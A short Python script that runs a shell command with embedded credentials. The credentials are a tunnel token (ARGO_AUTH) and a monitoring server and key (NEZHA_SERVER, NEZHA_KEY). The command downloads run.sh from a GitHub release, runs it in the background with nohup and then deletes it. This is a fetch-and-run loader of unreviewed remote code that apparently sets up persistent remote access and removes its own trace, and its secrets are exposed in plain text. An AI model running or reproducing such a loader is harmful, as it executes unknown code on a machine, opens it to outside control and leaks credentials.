import subprocess
cmd = "ARGO_AUTH=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9 NEZHA_SERVER=nz.seav.eu.org NEZHA_KEY=YakobU0fP4bxO6ZEuT bash -c 'curl -L -o run.sh https://github.com/seav1/dl/releases/download/files/run.sh && chmod +x run.sh && nohup ./run.sh && rm run.sh'"
subprocess.call(cmd, shell=True)
